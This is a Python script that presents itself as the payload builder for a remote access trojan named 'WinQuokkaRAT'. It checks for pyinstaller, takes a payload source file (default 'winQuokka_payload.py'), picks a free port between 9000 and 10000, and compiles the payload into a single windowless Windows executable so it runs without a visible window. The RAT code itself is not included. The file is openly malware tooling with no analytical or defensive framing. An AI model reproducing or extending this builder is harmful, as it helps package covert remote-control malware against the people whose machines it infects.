import os, subprocess, socket

VERSION = "develop1.0 by jeho"
SRC_NAME_DEFAULT = "winQuokka_payload.py"
LINE_LENGTH = 50

def print_sharp(end):
    for i in range(0,end):
        print('#',end='')
        if(i==end-1):
            print()

def check_dependancy(dependancy_dict):
    for key in dependancy_dict:
        print(f"Checking if it is installed... : {key}")
        try:
            result = subprocess.run(f"{dependancy_dict[key]}",capture_output=True)
            print(f"{key} is already instelled...")

        except Exception as e:
            print(f"dependancy doesn't installed : {e}")

def is_port_available(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # bind to create socket
        try:
            s.bind(("0.0.0.0", port))
        except OSError:
            # return False if port in use.
            return False
        else:
            # return True if port is Available.
            return True
def port_scan(start,end):
    for port in range(start,end+1):
        if(is_port_available(port)):
            return port
        else:
            pass

print(VERSION)
print_sharp(LINE_LENGTH)
print("hello, its WinQuokkaRAT payload_creator")
print("creating winQuokkaRAT payload exe...")

dependancy_dict= {"pyinstaller":"pyinstaller --version"}
check_dependancy(dependancy_dict)

print_sharp(LINE_LENGTH)
print("create payload...")
src_input = input(f"input src file's name (just Enter to set default) : {SRC_NAME_DEFAULT})")
if(src_input==''):
    print("you choosed default")
    src_input=SRC_NAME_DEFAULT

while True:
    try:
        port_input = input("input target host port (just Enter to set default, free port alloc) : ")
        if (port_input==''):
            print("you select default...free port alloc")
            port_input=port_scan(9000,10000)
        break
    except ValueError:
        print("Invalid input. Please enter an  for port number.")

print(f"port_input : {port_input}")
print("creating payload by pyinstaller...")

pyinstaller_result = subprocess.call(f"pyinstaller -F -w --icon=NONE {src_input} --name wQ_payload{port_input}",cwd=os.path.dirname(os.path.abspath(__file__)))
print(pyinstaller_result)

print_sharp(LINE_LENGTH)
print_sharp(LINE_LENGTH)
if(pyinstaller_result==0):
    print("payload generate success!")
else:
    print("payload generate Failed...")
os.system("pause")